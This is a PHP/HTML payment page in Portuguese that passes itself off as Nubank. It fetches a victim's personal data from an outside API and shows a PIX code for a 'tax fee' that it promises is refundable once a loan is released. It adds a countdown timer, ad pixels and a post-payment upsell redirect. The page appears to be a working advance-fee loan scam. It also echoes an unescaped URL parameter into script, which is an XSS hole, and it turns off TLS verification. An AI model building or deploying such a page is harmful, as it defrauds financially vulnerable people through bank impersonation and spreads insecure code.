<?php


// Recebe o identificador via POST
$identificador = $_GET['transactionId'] ?? null;
if (!$identificador) {
    http_response_code(400);
    echo json_encode(['erro' => 'Identificador não informado.']);
    exit;
}

// Faz a chamada cURL
$url = 'https://app.arkwave.space/api/transaction/index.php';

$payload = json_encode(['identificador' => $identificador]);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($payload)
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    http_response_code(500);
    echo json_encode(['erro' => 'Erro ao conectar: ' . curl_error($ch)]);
    curl_close($ch);
    exit;
}

curl_close($ch);

// Converte a resposta JSON
$data = json_decode($response, true);

if (!is_array($data) || count($data) === 0) {
    http_response_code(404);
    echo json_encode(['erro' => 'Dados não encontrados para o identificador.']);
    exit;
}

// Pega o primeiro item do array (único esperado)
$item = $data[0];

// Armazena as variáveis individualmente
$id = $item['id'];
$email = $item['email'];
$telefone = $item['telefone'];
$nome = $item['nome'];
$documento = $item['documento'];
$cep = $item['cep'];
$rua = $item['rua'];
$numero = $item['numero'];
$complemento = $item['complemento'];
$bairro = $item['bairro'];
$cidade = $item['cidade'];
$uf = $item['uf'];
$pais = $item['pais'];
$valor_parcelas = $item['valor_parcelas'];
$created_at = $item['created_at'];
$metodo = $item['metodo'];
$str = $item['str'];
$lip = $item['lip'];
$copiaecola = $item['copiaecola'];
$id_transaction = $item['id_transaction'];
$product_id = $item['product_id'];
$status = $item['status'];
$utms = $item['utms'];
$fbp = $item['fbp'];
$fbc = $item['fbc'];
$fbclid = $item['fbclid'];
$user_agent = $item['user_agent'];
$ip_address = $item['ip_address'];
$timestamp = $item['timestamp'];
$gclid = $item['gclid'];

$logo= "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Nubank_logo.svg/2560px-Nubank_logo.svg.png";
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head><script src=" https://cdn.jsdelivr.net/npm/lobibox@1.2.7/dist/js/lobibox.min.js"></script>
<link href=" https://cdn.jsdelivr.net/npm/lobibox@1.2.7/dist/css/lobibox.min.css" rel="stylesheet">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX</title>
<link rel="shortcut icon" href="logo.png">
<link rel="shortcut icon" href="logo.png">
<link rel="icon" href="logo.png" sizes="32x32">
<link rel="icon" href="logo.png" sizes="192x192">
<link rel="apple-touch-icon" href="logo.png">
<meta name="msapplication-TileImage" content="logo.png">
<link href="../public/css/swiper-bundle.min.css" rel="stylesheet">
<link href="../public/css/bootstrap.min.css" rel="stylesheet">
<link href="../public/css/all.min.css" rel="stylesheet">
<link href="../public/css/style.css?v=1.0.3" rel="stylesheet">

<script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "simxqbeoht");
</script>
<script>

// Função para verificar o status da transação
async function checkPaymentStatus() {
    try {
        // Obtém o ID da transação da URL
        const urlParams = new URLSearchParams(window.location.search);
        const transactionId = urlParams.get('transactionId');
        
        if (!transactionId) {
            throw new Error('ID da transação não encontrado na URL');
        }
        
        // Faz a requisição para o endpoint verificar.php
        const response = await fetch(`verificar.php?id=${transactionId}`);
        
        if (!response.ok) {
            throw new Error(`Erro HTTP! status: ${response.status}`);
        }
        
        const data = await response.json();
        
        // Atualiza o status na página (opcional)
        if (document.getElementById('payment-status')) {
            document.getElementById('payment-status').textContent = 
                `Status atual: ${data.status || 'Desconhecido'}`;
        }
        
        // Se o status for "PAID", redireciona para o link de upsell
        if (data.status && data.status.toUpperCase() === 'PAID' && data.upsell) {
            window.location.href = data.upsell + window.location.search;
            return true; // Para a execução
        }
        
        return false;
    } catch (error) {
        console.error('Erro ao verificar status:', error);
        
        // Atualiza mensagem de erro na página (opcional)
        if (document.getElementById('payment-status')) {
            document.getElementById('payment-status').textContent = 
                'Erro ao verificar status. Tentando novamente...';
        }
        
        return false;
    }
}

// Verifica imediatamente e depois a cada 3 segundos
checkPaymentStatus();
const intervalId = setInterval(async () => {
    const isPaid = await checkPaymentStatus();
    if (isPaid) {
        clearInterval(intervalId); // Para o intervalo se foi redirecionado
    }
}, 3000);

// Limpa o intervalo quando a página é fechada
window.addEventListener('beforeunload', () => {
    clearInterval(intervalId);
});

</script>  <?php
$url = 'https://app.arkwave.space/api/tracker/tracker.php';
$data = array(
    "string_checkout" => "ba6862b67a0381f60920ce08dd4e4f00",
    "evento" => "InitiateCheckout",
    "dominio" => "cnhdigital"
);
$jsonData = json_encode($data);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($jsonData)
));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
print_r($response);
curl_close($ch);
?>
<style>
    :root {
        --primary-color: #820AD1;
        --primary-hover: #820AD1;
        --success-color: #4cc9a0;
        --text-color: #2b2d42;
        --text-light: #8d99ae;
        --background: #f8f9fa;
        --card-bg: #ffffff;
        --border-color: #e9ecef;
        --highlight-color: #ffd60a;
        --countdown-color: #ef233c;
    }

    body {
        background-color: var(--background);
        color: var(--text-color);
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        margin: 0;
        padding: 0;
        line-height: 1.6;
    }

    @supports (font-variation-settings: normal) {
        body {
            font-family: 'Inter var', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
    }

    .top-bar {
        background-color: var(--card-bg);
        border-bottom: 1px solid var(--border-color);
        padding: 16px 24px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
    }

    .top-bar-content {
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 10px;
        max-width: 1200px;
        margin: 0 auto;
    }

    .logo {
        height: auto;
        max-width: 180px;
        width: 100%;
        transition: transform 0.3s ease;
    }

    .logo:hover {
        transform: scale(1.02);
    }

    .secure-badge {
        font-size: 14px;
        color: var(--text-light);
        display: flex;
        align-items: center;
        white-space: nowrap;
        background-color: rgba(67, 97, 238, 0.1);
        padding: 8px 12px;
        border-radius: 20px;
        font-weight: 500;
    }

    .secure-badge svg {
        margin-right: 6px;
        stroke: var(--primary-color);
    }

    .container {
        max-width: 520px;
        margin: 0 auto;
        padding: 32px 16px;
    }

    .card {
        background-color: var(--card-bg);
        border-radius: 16px;
        padding: 32px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
        border: 1px solid var(--border-color);
        transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .card:hover {
        transform: translateY(-2px);
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
    }

    .title {
        font-size: 24px;
        font-weight: 700;
        margin-bottom: 24px;
        text-align: center;
        color: var(--text-color);
        position: relative;
        padding-bottom: 16px;
    }

    .title:after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 50%;
        transform: translateX(-50%);
        width: 60px;
        height: 3px;
        background-color: var(--primary-color);
        border-radius: 3px;
    }

    .pix-value-label {
        color: var(--text-light);
        margin-bottom: 8px;
        text-align: center;
        font-size: 15px;
        font-weight: 500;
    }

    .pix-amount {
        font-size: 32px;
        color: black;
        font-weight: 700;
        text-align: center;
        margin-bottom: 24px;
    }

    .pix-input {
        display: block;
        margin: 0 auto 16px auto;
        width: 83%;
        padding: 16px;
        border: 1px solid var(--border-color);
        border-radius: 10px;
        background-color: var(--card-bg);
        color: var(--text-color);
        font-size: 16px;
        text-align: center;
        font-family: 'Roboto Mono', monospace;
        transition: border-color 0.3s ease, box-shadow 0.3s ease;
    }

    .pix-input:focus {
        outline: none;
        border-color: var(--primary-color);
        box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
    }

    .copy-button {
        background-color: var(--primary-color);
        color: white;
        border: none;
        padding: 16px;
        border-radius: 10px;
        font-weight: 600;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 8px;
        cursor: pointer;
        transition: all 0.3s ease;
        font-size: 16px;
    }

    .copy-button:hover {
        background-color: var(--primary-hover);
        transform: translateY(-1px);
        box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
    }

    .copy-button:active {
        transform: translateY(0);
    }

    .copy-button svg {
        width: 20px;
        height: 20px;
    }

    .instructions {
        margin-top: 40px;
    }

    .instructions h2 {
        font-size: 20px;
        font-weight: 600;
        margin-bottom: 20px;
        color: var(--text-color);
    }

    .instruction-item {
        display: flex;
        gap: 16px;
        margin-bottom: 20px;
        color: var(--text-color);
        font-size: 15px;
        align-items: flex-start;
    }

    .instruction-item svg {
        flex-shrink: 0;
        width: 24px;
        height: 24px;
        stroke: var(--primary-color);
        stroke-width: 1.5;
    }

    .instruction-text {
        margin: 0;
        line-height: 1.5;
    }

    #countdown {
        font-size: 18px;
        font-weight: 700;
        color: var(--countdown-color);
        text-align: center;
        margin: 20px 0;
        padding: 12px;
        background-color: rgba(239, 35, 60, 0.1);
        border-radius: 8px;
    }

    .pix-wrapper {
        max-width: 420px;
        margin: 0 auto;
        display: flex;
        flex-direction: column;
        gap: 16px;
    }

    .hidden {
        display: none !important;
    }

    #loadingPage {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.9);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        backdrop-filter: blur(5px);
    }

    .loader {
        border: 5px solid #f3f3f3;
        border-top: 5px solid var(--primary-color);
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .qr-code-container {
        display: none;
        justify-content: center;
        margin: 24px 0;
    }

    .qr-code {
        max-width: 200px;
        background-color: white;
        padding: 16px;
        border-radius: 12px;
        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
        border: 1px solid var(--border-color);
    }

    /* Pagamento Confirmado */
    #pagamentoConfirmado .card {
        text-align: center;
    }

    #pagamentoConfirmado svg {
        margin-bottom: 16px;
        stroke: var(--success-color);
    }

    #pagamentoConfirmado h1 {
        color: var(--success-color);
    }

    #pagamentoConfirmado p {
        margin: 8px 0;
        color: var(--text-color);
    }

    @media (max-width: 480px) {
        .container {
            padding: 24px 12px;
        }
        
        .card {
            padding: 24px 16px;
        }
        
        .title {
            font-size: 20px;
        }
        
        .pix-amount {
            font-size: 28px;
        }
        
        .secure-badge {
            font-size: 13px;
            padding: 6px 10px;
        }
        
        .logo {
            max-width: 140px;
        }
        
        .instruction-item {
            gap: 12px;
            margin-bottom: 16px;
        }
    }

    /* Animations */
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    .card {
        animation: fadeIn 0.5s ease-out;
    }
</style>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto+Mono&display=swap" rel="stylesheet">

<script>
  window.pixelId = "670d499135d74746279730c8";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>

<script
src="https://cdn.utmify.com.br/scripts/utms/latest.js"
data-utmify-prevent-xcod-sck
data-utmify-prevent-subids
async
defer
></script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17021708740"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());

gtag('config', 'AW-17021708740');
</script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4ZG2GXN0KF"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());

gtag('config', 'G-4ZG2GXN0KF');
</script>

<!-- Meta Pixel Code -->
<script>
!function (f, b, e, v, n, t, s) {
  if (f.fbq) return; n = f.fbq = function () {
    n.callMethod ?
    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
  };
  if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
  n.queue = []; t = b.createElement(e); t.async = !0;
  t.src = v; s = b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t, s)
}(window, document, 'script',
  'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1784985622083891');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1784985622083891&ev=PageView&noscript=1" /></noscript>
<!-- End Meta Pixel Code -->

</head>

<body cz-shortcut-listen="true">

    <!-- Loading Screen -->
    <div id="loadingPage" class="hidden">
        <div class="loader"></div>
    </div>

    <div id="loginPage">
        <div class="top-bar">
            <div class="top-bar-content">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Nubank_logo.svg/2560px-Nubank_logo.svg.png" alt="Logo" class="logo">
                <div class="secure-badge">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M9 12l2 2 4-4"></path>
                        <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                    <span>Ambiente seguro</span>
                </div>
            </div>
        </div>
                   
<img src="banner.png" alt="" width="100%">

        <div class="container">
            <div class="card">
                <div class="text-center">
                    <h1 class="title">Finalize o pagamento</h1>
                </div>

                <div class="pix-value">
                    <p class="pix-value-label">Valor do pix:</p>
                    <p class="pix-amount">R$ <?php echo $valor_parcelas; ?></p>
                </div>

                <div class="pix-wrapper">
                    <input type="text" class="pix-input" value="<?php echo $copiaecola ?>" readonly id="codigo-input">
                    <button id="copyButton" class="copy-button">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                            <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path>
                        </svg>
                        <span>COPIAR CÓDIGO</span>
                    </button>
                </div>

                <div id="imagemContainer" class="hidden qr-code-container">
                    <!-- QR Code será inserido aqui -->
                </div>

                <!-- Elemento para exibir a contagem regressiva -->
                <!-- Substitua este elemento -->
<!-- <div id="countdown"></div> -->

<!-- Pelo novo cronômetro visual -->
<div class="countdown-container">
    <div class="countdown-header">
        <span>Tempo restante para pagamento:</span>
        <span id="countdown-timer">08:00</span>
    </div>
    <div class="countdown-bar">
        <div class="countdown-progress" id="countdown-progress"></div>
    </div>
</div>

<style>
.countdown-container {
    margin: 25px 0;
    font-family: 'Inter', sans-serif;
}

.countdown-header {
    display: flex;
    justify-content: space-between;
    margin-bottom: 8px;
    font-size: 14px;
    color: #555;
}

.countdown-bar {
    height: 8px;
    background-color: #f0f0f0;
    border-radius: 4px;
    overflow: hidden;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
}

.countdown-progress {
    height: 100%;
    width: 100%;
    background-color: var(--primary-color);
    border-radius: 4px;
    transition: width 1s linear, background-color 0.3s;
}

/* Estilos para quando o tempo estiver acabando */
.countdown-warning {
    background-color: #FFA500;
}

.countdown-danger {
    background-color: #FF5252;
}

#countdown-timer {
    font-weight: bold;
    color: var(--text-color);
}
</style>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
    // Configuração inicial
    let countdownInterval;
    const totalTime = 08 * 60; // 30 minutos em segundos
    let timeLeft = totalTime;
    
    // Elementos do DOM
    const $countdownTimer = $('#countdown-timer');
    const $countdownProgress = $('#countdown-progress');
    
    // Função para formatar o tempo
    function formatTime(seconds) {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    }
    
    // Função para atualizar a barra de progresso
    function updateProgressBar() {
        const progressPercentage = (timeLeft / totalTime) * 100;
        $countdownProgress.css('width', progressPercentage + '%');
        
        // Mudar cor conforme o tempo diminui
        if (progressPercentage < 20) {
            $countdownProgress.removeClass('countdown-warning').addClass('countdown-danger');
        } else if (progressPercentage < 50) {
            $countdownProgress.removeClass('countdown-danger').addClass('countdown-warning');
        } else {
            $countdownProgress.removeClass('countdown-warning countdown-danger');
        }
    }
    
    // Iniciar contagem regressiva
    function startCountdown() {
        countdownInterval = setInterval(function() {
            timeLeft--;
            
            // Atualizar exibição
            $countdownTimer.text(formatTime(timeLeft));
            updateProgressBar();
            
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
               
                $countdownProgress.css('width', '0%');
            }
        }, 1000);
    }
    
    // Iniciar o contador quando a página carregar
    startCountdown();
    updateProgressBar(); // Inicializar a barra
});
</script>
   <div class="container">
    <div class="card shopping-cart">
 
        
      
            
            <!-- Seção de Dados do Pagador -->
            <div class="order-section">
                <h3 class="section-title">Dados do Cliente</h3>
                <div class="customer-info">
                    <div class="info-row">
                        <span class="info-label">Nome:</span>
                        <span class="info-value"><?php echo $nome; ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Telefone:</span>
                        <span class="info-value"><?php echo $telefone; ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Documento:</span>
                        <span class="info-value"><?php echo $documento; ?></span>
                    </div>
                </div>
            </div>
            
           
            
            <!-- Seção de Pagamento -->
            <div class="order-section">
                <h3 class="">Valor 100% reembolsável após liberação do empréstimo.</h3>
                <div class="payment-method">
                    <div class="method-icon">
                        <?php if($metodo == 'PIX'): ?>
                        <?php elseif($metodo == 'BOLETO'): ?>
                            <i class="fas fa-barcode"></i>
                        <?php else: ?>
                            <i class="fas fa-credit-card"></i>
                        <?php endif; ?>
                    </div>
                    <div class="method-info">
                        <h4> TAXA DE IMPOSTO</h4>
                        <div class="amount-total">
                            Total: <span class="total-value">R$ <?php echo number_format($valor_parcelas, 2, ',', '.'); ?></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="card-footer">
            <div class="order-summary">
                <div class="summary-row total">
                    <span>Total:</span>
                    <span>R$ <?php echo number_format($valor_parcelas, 2, ',', '.'); ?></span>
                </div>
            </div>
            
        </div>
    </div>
</div>
            </div>
        </div>
    </div>

    <!-- Pagamento Confirmado (hidden por padrão) -->
    <div id="pagamentoConfirmado" class="hidden">
        <div class="container">
            <div class="card">
                <div class="text-center">
                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M22 11.08V12a10 10 0 11-5.93-9.14"></path>
                        <path d="M22 4L12 14.01l-3-3"></path>
                    </svg>
                    <h1 class="title">Pagamento Confirmado!</h1>
                    <p>Obrigado por sua compra.</p>
                    <p>Data: <span id="data-pagamento"></span></p>
                    <p>Protocolo: <span id="protocolo-pagamento"></span></p>
                </div>
            </div>
        </div>
    </div>
 

<style>
.shopping-cart {
    border-radius: 10px;
    overflow: hidden;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
}

.card-header {
    padding: 15px 20px;
    border-bottom: 1px solid rgba(0,0,0,0.1);
}

.order-section {
    margin-bottom: 25px;
    padding-bottom: 15px;
    border-bottom: 1px solid #eee;
}

.section-title {
    font-size: 18px;
    margin-bottom: 15px;
    color: #333;
    display: flex;
    align-items: center;
}

.section-title:before {
    content: "";
    display: inline-block;
    width: 4px;
    height: 18px;
    background: var(--primary-color);
    margin-right: 10px;
    border-radius: 2px;
}

.product-item {
    display: flex;
    align-items: center;
    padding: 10px;
    background: #f9f9f9;
    border-radius: 8px;
}

.product-info {
    flex: 1;
}

.product-name {
    font-size: 16px;
    margin-bottom: 5px;
    color: #333;
}

.product-price {
    font-weight: bold;
    color: var(--primary-color);
}

.info-row {
    display: flex;
    margin-bottom: 10px;
}

.info-label {
    font-weight: 600;
    width: 120px;
    color: #666;
}

.info-value {
    flex: 1;
    color: #333;
}

.payment-method {
    display: flex;
    align-items: center;
    padding: 15px;
    background: #f5f9ff;
    border-radius: 8px;
}

.method-icon {
    width: 40px;
    height: 40px;
    background-size: contain;
    background-image: url('<?php
if (!isset($_GET['upsell'])) {
    echo 'https://i.imgur.com/qNjKcdI.jpeg';
}else{
    echo 'https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png';
}
?>');
    color: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-right: 15px;
    font-size: 18px;
}

.method-info h4 {
    margin: 0 0 5px 0;
    color: #333;
}

.amount-total {
    font-size: 16px;
}

.total-value {
    font-weight: bold;
    color: black;
    font-size: 18px;
}

.card-footer {
    background: #f9f9f9;
   
}

.order-summary {
    margin-bottom: 20px;
}

.summary-row {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px dashed #ddd;
}

.summary-row.total {
    font-weight: bold;
    font-size: 18px;
    border-bottom: none;
    padding-bottom: 0;
    margin-top: 15px;
}

.btn-confirm {
    padding: 12px;
    font-weight: 600;
    font-size: 16px;
    border-radius: 8px;
    background: var(--primary-color);
    border: none;
    transition: all 0.3s;
}

.btn-confirm:hover {
    background: var(--primary-hover);
    transform: translateY(-2px);
    box-shadow: 0 5px 10px rgba(0,0,0,0.1);
}

@media (max-width: 768px) {
    .info-row {
        flex-direction: column;
    }
    
    .info-label {
        width: auto;
        margin-bottom: 3px;
    }
}
</style>
<div class="container">

<div style="
 
">
<?php
if (!isset($_GET['upsell'])) {
    echo '<img src="https://i.imgur.com/2US1pU8.png" alt="" width="100%">';
}
?>


</div></div>
    <!-- Inclua o jQuery antes do seu script -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Se estiver usando o toastr, inclua-o também -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
  
<!-- Adicione estas linhas no head do seu HTML -->

<footer class="site-footer">
    <div class="footer-container">
        <div class="footer-section">
            <div class="footer-logo">
                <img src="https://cdn.prod.website-files.com/67c8892b57b9b47c3c7894f6/67c8ed9ef23511f4615d529e_nubank-logo-branco.png" alt="Logo" width="150">
            </div>
            <div class="footer-social">
                <a href="#" target="_blank" class="social-icon"><i class="fab fa-facebook-f"></i></a>
                <a href="#" target="_blank" class="social-icon"><i class="fab fa-instagram"></i></a>
                <a href="#" target="_blank" class="social-icon"><i class="fab fa-whatsapp"></i></a>
            </div>
        </div>
        
        
        <div class="footer-section">
            <h3 class="footer-title">Atendimento</h3>
            <ul class="footer-links">
                <li><i class="fas fa-envelope"></i> contato@Nubank.com</li>
                <li><i class="fas fa-phone-alt"></i> 0800 772 1026</li>
                <li><i class="fas fa-clock"></i> Seg-Sex: 9h às 18h</li>
            </ul>
        </div>
        
    </div>
    
    <div class="footer-bottom">
        <div class="footer-container">
            <p>&copy; <?php echo date('Y'); ?> Todos os direitos reservados. CNPJ: 36.272.465/0001-49</p>
        </div>
    </div>
</footer>

<style>
.site-footer {
    background-color: #000000ff;
    color: #ecf0f1;
    padding: 40px 0 0;
    font-family: 'Inter', sans-serif;
}

.footer-container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    gap: 30px;
}

.footer-section {
    flex: 1;
    min-width: 200px;
    margin-bottom: 30px;
}

.footer-logo img {
    max-width: 100%;
    height: auto;
    margin-bottom: 15px;
}

.footer-social {
    display: none;
    gap: 15px;
}

.social-icon {
    color: #ecf0f1;
    background-color: #34495e;
    width: 36px;
    height: 36px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
}

.social-icon:hover {
    background-color: var(--primary-color);
    transform: translateY(-3px);
}

.footer-title {
    font-size: 18px;
    margin-bottom: 20px;
    position: relative;
    padding-bottom: 10px;
    color: #fff;
}

.footer-title:after {
    content: '';
    position: absolute;
    left: 0;
    bottom: 0;
    width: 40px;
    height: 2px;
    background-color: var(--primary-color);
}

.footer-links {
    list-style: none;
    padding: 0;
    margin: 0;
}

.footer-links li {
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 10px;
}

.footer-links a {
    color: #bdc3c7;
    text-decoration: none;
    transition: color 0.3s;
}

.footer-links a:hover {
    color: var(--primary-color);
}

.footer-links i {
    color: var(--primary-color);
    width: 16px;
    text-align: center;
}

.payment-methods {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 20px;
}

.payment-methods img {
    border-radius: 4px;
    background: white;
    padding: 5px;
}

.security-seals img {
    max-width: 100%;
    height: auto;
}

.footer-bottom {
    background-color: #000000ff;
    padding: 15px 0;
    text-align: center;
    font-size: 14px;
}

.footer-bottom p {
    margin: 0;
    color: #7f8c8d;
}

@media (max-width: 768px) {
    .footer-container {
        flex-direction: column;
        gap: 20px;
    }
    
    .footer-section {
        min-width: 100%;
    }
}
</style>

<!-- Adicione isso no head do seu HTML se ainda não tiver -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
<!-- Adicione este script no final do body, antes do fechamento </body> -->
<script>
$(document).ready(function() {
  
    
    // Botão de copiar
    $('#copyButton').click(function() {
        const copyText = document.getElementById("codigo-input");
        copyText.select();
        copyText.setSelectionRange(0, 99999); // Para dispositivos móveis
        
        document.execCommand("copy");
   
        
        // Mudar temporariamente o texto do botão
        $(this).find('span').text('CÓDIGO COPIADO!');
        $(this).css('background-color', '#212121');
        $(this).css('color', '#fff');
        
        setTimeout(() => {
            $('#copyButton').find('span').text('COPIAR CÓDIGO');
            $('#copyButton').css('background-color', '#820AD1');
            $('#copyButton').css('color', '#000');
            
        }, 10000);
    });
    
    // Verificar status do pagamento periodicamente
    function checkPaymentStatus() {
        $.ajax({
            url: 'https://app.arkwave.space/api/transaction/index.php',
            method: 'POST',
            data: JSON.stringify({ identificador: '<?php echo $identificador; ?>' }),
            contentType: 'application/json',
            dataType: 'json',
            success: function(response) {
                if (response && response.length > 0 && response[0].status === 'approved') {
                    clearInterval(countdownInterval);
                    $('#loginPage').addClass('hidden');
                    $('#pagamentoConfirmado').removeClass('hidden');
                    $('#data-pagamento').text(new Date().toLocaleString());
                    $('#protocolo-pagamento').text(response[0].id_transaction);
                    
                   
                }
            },
            error: function(xhr, status, error) {
                console.error('Erro ao verificar status:', error);
            }
        });
    }
    
    // Verificar a cada 30 segundos
    setInterval(checkPaymentStatus, 30000);
    
    // Esconder loading screen quando a página carrega
    setTimeout(function() {
        $('#loadingPage').addClass('hidden');
    }, 1000);
});
</script><script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "silz60upc3");
</script>